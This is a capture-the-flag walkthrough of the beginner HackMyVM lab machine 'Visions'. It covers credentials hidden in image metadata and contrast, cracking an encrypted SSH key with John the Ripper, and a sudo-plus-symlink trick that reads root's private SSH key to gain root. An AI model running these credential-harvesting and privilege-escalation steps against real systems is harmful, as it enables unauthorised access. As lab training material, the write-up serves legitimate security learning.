# Visions

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Visions | sml | Beginner | HackMyVM |

**Summary:** Visions is a beginner-level machine that emphasizes steganography and image analysis techniques. The initial attack vector involves discovering hidden credentials within image metadata and using contrast manipulation to reveal concealed text. The privilege escalation chain requires lateral movement through multiple users by exploiting sudo permissions and symbolic link manipulation to access sensitive files. Key techniques include metadata extraction, image forensics, SSH key cracking with John the Ripper, and leveraging sudo misconfigurations for privilege escalation.

---

## Reconnaissance

### Network Discovery

The initial reconnaissance began with network scanning to identify the target machine within the virtual environment.

```bash
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.56 08:00:27:2F:35:4A VirtualBox
```

The network scan identified the target at IP address `192.168.100.56` running in VirtualBox.

### Port Scanning

A comprehensive Nmap scan was performed to identify open services and potential attack vectors.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/visions]
└─$ nmap -sC -sV -p- 192.168.100.56
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-01 06:45 WIB
Nmap scan report for 192.168.100.56
Host is up (0.016s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 85:d0:93:ff:b6:be:e8:48:a9:2c:86:4c:b6:84:1f:85 (RSA)
|   256 5d:fb:77:a5:d3:34:4c:46:96:b6:28:a2:6b:9f:74:de (ECDSA)
|_  256 76:3a:c5:88:89:f2:ab:82:05:80:80:f9:6c:3b:20:9d (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.49 seconds
```

The scan revealed two open ports:
- **Port 22 (SSH)**: OpenSSH 7.9p1 running on Debian 10
- **Port 80 (HTTP)**: nginx 1.14.2 web server

### Web Application Analysis

Initial examination of the web service revealed an interesting HTML comment and a hidden image reference.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/visions]
└─$ curl 192.168.100.56
<!--
Only those that can see the invisible can do the imposible.
You have to be able to see what doesnt exist.
Only those that can see the invisible being able to see whats not there.
-alicia -->
...
 <img src="white.png">
 ```

The HTML source contained philosophical comments signed by "alicia" and referenced a `white.png` image located far down the page, requiring extensive scrolling to reach.

### Image Discovery and Analysis

The `white.png` file was identified and downloaded for analysis.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/visions]
└─$ curl -I 192.168.100.56/white.png
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Sat, 31 Jan 2026 23:56:25 GMT
Content-Type: image/png
Content-Length: 12655
Last-Modified: Mon, 19 Apr 2021 09:05:04 GMT
Connection: keep-alive
ETag: "607d47c0-316f"
Accept-Ranges: bytes


┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/visions]
└─$ curl -O 192.168.100.56/white.png
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 12655 100 12655    0     0 65878     0  --:--:-- --:--:-- --:--:-- 65911
```

Metadata analysis using ExifTool revealed critical information embedded in the image.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/visions]
└─$ exiftool white.png
ExifTool Version Number         : 13.36
File Name                       : white.png
Directory                       : .
File Size                       : 13 kB
File Modification Date/Time     : 2026:02:01 06:56:31+07:00
File Access Date/Time           : 2026:02:01 06:56:49+07:00
File Inode Change Date/Time     : 2026:02:01 06:56:31+07:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 1920
Image Height                    : 1080
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Background Color                : 255 255 255
Pixels Per Unit X               : 11811
Pixels Per Unit Y               : 11811
Pixel Units                     : meters
Modify Date                     : 2021:04:19 08:26:43
Comment                         : pw:i[REDACTED]
Image Size                      : 1920x1080
Megapixels                      : 2.1
```

The metadata analysis revealed a password (`i[REDACTED]`) in the Comment field, likely belonging to user "alicia" based on the HTML comments.

---

## Initial Access

### SSH Access as Alicia

Using the discovered credentials from the image metadata, SSH access was obtained.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/visions]
└─$ ssh alicia@192.168.100.56
...
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
alicia@192.168.100.56's password: 
Linux visions 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64
...
alicia@visions:~$ id
uid=1001(alicia) gid=1001(alicia) groups=1001(alicia)
alicia@visions:~$ ls -la
total 20
drwxr-xr-x 2 alicia alicia 4096 Apr 19  2021 .
drwxr-xr-x 6 root   root   4096 Apr 19  2021 ..
-rw-r--r-- 1 alicia alicia  220 Apr 19  2021 .bash_logout
-rw-r--r-- 1 alicia alicia 3526 Apr 19  2021 .bashrc
-rw-r--r-- 1 alicia alicia  807 Apr 19  2021 .profile
```

### System Enumeration

Initial enumeration revealed multiple user accounts and their home directories.

```bash
alicia@visions:~$ ls -la /home
total 24
drwxr-xr-x  6 root     root     4096 Apr 19  2021 .
drwxr-xr-x 18 root     root     4096 Apr 19  2021 ..
drwxr-xr-x  2 alicia   alicia   4096 Apr 19  2021 alicia
drwxr-xr-x  3 emma     emma     4096 Apr 19  2021 emma
drwxr-xr-x  3 isabella isabella 4096 Apr 19  2021 isabella
drwxr-xr-x  3 sophia   sophia   4096 Apr 19  2021 sophia
```

Detailed examination of each user's home directory revealed important files:

```bash
alicia@visions:~$ ls -la /home/emma
total 32
drwxr-xr-x 3 emma emma 4096 Apr 19  2021 .
drwxr-xr-x 6 root root 4096 Apr 19  2021 ..
-rw-r--r-- 1 emma emma  220 Apr 19  2021 .bash_logout
-rw-r--r-- 1 emma emma 3526 Apr 19  2021 .bashrc
drwxr-xr-x 3 emma emma 4096 Apr 19  2021 .local
-rw------- 1 emma emma   20 Apr 19  2021 note.txt
-rw-r--r-- 1 emma emma  807 Apr 19  2021 .profile
-rw------- 1 emma emma   53 Apr 19  2021 .Xauthority
alicia@visions:~$ ls -la /home/isabella
total 28
drwxr-xr-x 3 isabella isabella 4096 Apr 19  2021 .
drwxr-xr-x 6 root     root     4096 Apr 19  2021 ..
-rw-r--r-- 1 isabella isabella  220 Apr 19  2021 .bash_logout
-rw-r--r-- 1 isabella isabella 3526 Apr 19  2021 .bashrc
-rw------- 1 isabella isabella 1876 Apr 19  2021 .invisible
-rw-r--r-- 1 isabella isabella  807 Apr 19  2021 .profile
drwx------ 2 isabella isabella 4096 Apr 19  2021 .ssh
alicia@visions:~$ ls -la /home/sophia
total 32
drwxr-xr-x 3 sophia sophia 4096 Apr 19  2021 .
drwxr-xr-x 6 root   root   4096 Apr 19  2021 ..
-rw-r--r-- 1 sophia sophia  220 Apr 19  2021 .bash_logout
-rw-r--r-- 1 sophia sophia 3526 Apr 19  2021 .bashrc
-rwx--x--x 1 sophia sophia 1920 Apr 19  2021 flag.sh
drwxr-xr-x 3 sophia sophia 4096 Apr 19  2021 .local
-rw-r--r-- 1 sophia sophia  807 Apr 19  2021 .profile
-rw------- 1 sophia sophia   18 Apr 19  2021 user.txt
```

Key findings:
- **Emma**: Has `note.txt` and potential sudo privileges
- **Isabella**: Contains `.invisible` file and `.ssh` directory
- **Sophia**: Has `user.txt` (user flag) and `flag.sh` script

### Privilege Analysis

Sudo privileges and SUID binaries were enumerated to identify potential escalation paths.

```bash
alicia@visions:~$ sudo -l
Matching Defaults entries for alicia on visions:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User alicia may run the following commands on visions:
    (emma) NOPASSWD: /usr/bin/nc
alicia@visions:~$ find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount
-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 157192 Jan 20  2021 /usr/bin/sudo
-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Alicia has sudo privileges to run `/usr/bin/nc` as user emma, providing a potential lateral movement path.

### Advanced Image Analysis

Further analysis of the `white.png` image revealed additional hidden credentials. Using online image editing tools like Photopea, contrast adjustment revealed concealed text.

![sophia credentials](image-1.png)

The contrast manipulation revealed credentials for user sophia: `sophia/see[REDACTED]`.

---

## Privilege Escalation

### Lateral Movement to Sophia

Using the credentials discovered through image contrast manipulation, access was gained to the sophia account.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/visions]
└─$ ssh sophia@192.168.100.56
...
sophia@192.168.100.56's password:
Linux visions 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64
...
sophia@visions:~$ id
uid=1002(sophia) gid=1002(sophia) groups=1002(sophia)
sophia@visions:~$ ls -la
total 32
drwxr-xr-x 3 sophia sophia 4096 Apr 19  2021 .
drwxr-xr-x 6 root   root   4096 Apr 19  2021 ..
-rw-r--r-- 1 sophia sophia  220 Apr 19  2021 .bash_logout
-rw-r--r-- 1 sophia sophia 3526 Apr 19  2021 .bashrc
-rwx--x--x 1 sophia sophia 1920 Apr 19  2021 flag.sh
drwxr-xr-x 3 sophia sophia 4096 Apr 19  2021 .local
-rw-r--r-- 1 sophia sophia  807 Apr 19  2021 .profile
-rw------- 1 sophia sophia   18 Apr 19  2021 user.txt
```

### Sudo Privileges Discovery

Analysis of sophia's sudo permissions revealed access to read Isabella's `.invisible` file.

```bash
sophia@visions:~$ sudo -l
Matching Defaults entries for sophia on visions:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sophia may run the following commands on visions:
    (ALL : ALL) NOPASSWD: /usr/bin/cat /home/isabella/.invisible
```

### SSH Key Discovery

Executing the sudo command revealed an encrypted SSH private key belonging to Isabella.

```bash
sophia@visions:~$ sudo /usr/bin/cat /home/isabella/.invisible
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBMekPa3i
............................[REDACTED]................................
KD/C2J6CKylbopifizfpEkmVqJRms=
-----END OPENSSH PRIVATE KEY-----
```

### SSH Key Cracking

The encrypted SSH key was transferred to the attacking machine for passphrase cracking using John the Ripper.

```bash
sophia@visions:~$ cat > ./key << EOF
> -----BEGIN OPENSSH PRIVATE KEY-----
> b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBMekPa3i
..............................[REDACTED]................................
> KD/C2J6CKylbopifizfpEkmVqJRms=
> -----END OPENSSH PRIVATE KEY-----
> EOF
sophia@visions:~$ chmod 600 ./key
sophia@visions:~$ ssh-keygen -y -f key
Enter passphrase:
Load key "key": incorrect passphrase supplied to decrypt private key
```

The key required a passphrase, so it was transferred to the local machine for cracking.

```bash
sophia@visions:~$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/visions]
└─$ wget 192.168.100.56:8888/key
--2026-02-01 07:32:14--  http://192.168.100.56:8888/key
Connecting to 192.168.100.56:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1876 (1.8K) [application/octet-stream]
Saving to: 'key'

key                       100%[==================================>]   1.83K  --.-KB/s    in 0s

2026-02-01 07:32:14 (3.80 MB/s) - 'key' saved [1876/1876]
```

John the Ripper was used to crack the SSH key passphrase.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/visions]
└─$ chmod 600 key

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/visions]
└─$ ssh2john key > hash

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/visions]
└─$ john hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
i[REDACTED]        (key)
1g 0:00:09:35 DONE (2026-02-01 07:43) 0.001738g/s 19.64p/s 19.64c/s 19.64C/s merda..damnyou
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/visions]
└─$ john --show hash
key:i[REDACTED]

1 password hash cracked, 0 left
```

The cracked passphrase confirmed the key belonged to Isabella.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/visions]
└─$ ssh-keygen -y -f key
Enter passphrase for "key":
ssh-rsa AAAAB3[REDACTED]2XPsmcZ isabella@visions
```

### Lateral Movement to Isabella

SSH access as Isabella was established using the cracked private key.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/visions]
└─$ ssh -i key isabella@192.168.100.56
...
Enter passphrase for key 'key':
Linux visions 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64
...
isabella@visions:~$ id
uid=1003(isabella) gid=1003(isabella) groups=1003(isabella)
isabella@visions:~$ ls -la
total 28
drwxr-xr-x 3 isabella isabella 4096 Apr 19  2021 .
drwxr-xr-x 6 root     root     4096 Apr 19  2021 ..
-rw-r--r-- 1 isabella isabella  220 Apr 19  2021 .bash_logout
-rw-r--r-- 1 isabella isabella 3526 Apr 19  2021 .bashrc
-rw------- 1 isabella isabella 1876 Apr 19  2021 .invisible
-rw-r--r-- 1 isabella isabella  807 Apr 19  2021 .profile
drwx------ 2 isabella isabella 4096 Apr 19  2021 .ssh
```

### Symbolic Link Attack for Root Access

Isabella's sudo permissions allowed running `/usr/bin/man` as emma, but a more direct approach was discovered. Since sophia could read Isabella's `.invisible` file, a symbolic link attack was employed to access root's SSH key.

```bash
isabella@visions:~$ sudo -l
Matching Defaults entries for isabella on visions:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User isabella may run the following commands on visions:
    (emma) NOPASSWD: /usr/bin/man
```

The `.invisible` file was replaced with a symbolic link pointing to root's SSH private key.

```bash
isabella@visions:~$ mv .invisible .invisible_old
isabella@visions:~$ ln -s /root/.ssh/id_rsa ./.invisible
isabella@visions:~$ ls -la ./.invisible
lrwxrwxrwx 1 isabella isabella 17 Jan 31 20:08 ./.invisible -> /root/.ssh/id_rsa
```

Sophia was then used to read the root SSH key through the symbolic link.

```bash
sophia@visions:~$ sudo /usr/bin/cat /home/isabella/.invisible
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
...............................[REDACTED].............................
x7Itf3P39SxqlP2pQwAAAAxyb290QHZpc2lvbnMBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
sophia@visions:~$ cat > ./root_key << EOF
> -----BEGIN OPENSSH PRIVATE KEY-----
> b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
................................[REDACTED]..............................
> x7Itf3P39SxqlP2pQwAAAAxyb290QHZpc2lvbnMBAgMEBQ==
> -----END OPENSSH PRIVATE KEY-----
> EOF
sophia@visions:~$ chmod 600 root_key
```

### Root Access Achievement

Using root's SSH private key, administrative access was obtained.

```bash
sophia@visions:~$ ssh -i root_key root@localhost
...
Are you sure you want to continue connecting (yes/no)? yes
...
Linux visions 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64
...
root@visions:~# id
uid=0(root) gid=0(root) groups=0(root)
root@visions:~# cat /root/root.txt /home/sophia/user.txt
[REDACTED]le
[REDACTED]er
```

---

## Attack Chain Summary

1. **Reconnaissance**: Conducted network discovery and identified target machine at 192.168.100.56 with SSH (22) and HTTP (80) services exposed
2. **Vulnerability Discovery**: Found hidden credentials in image metadata (Comment field: `pw:i[REDACTED]`) and additional credentials through contrast manipulation revealing `sophia/see[REDACTED]`
3. **Initial Exploitation**: Gained SSH access as user `alicia` using metadata-extracted credentials, then escalated to `sophia` using image steganography findings
4. **Lateral Movement**: Exploited sudo permission allowing sophia to read Isabella's `.invisible` file, discovered encrypted SSH private key, cracked passphrase using John the Ripper to access `isabella` account
5. **Privilege Escalation**: Implemented symbolic link attack by replacing Isabella's `.invisible` file with symlink to `/root/.ssh/id_rsa`, leveraged sophia's sudo privileges to read root's SSH key, achieved root access through SSH key authentication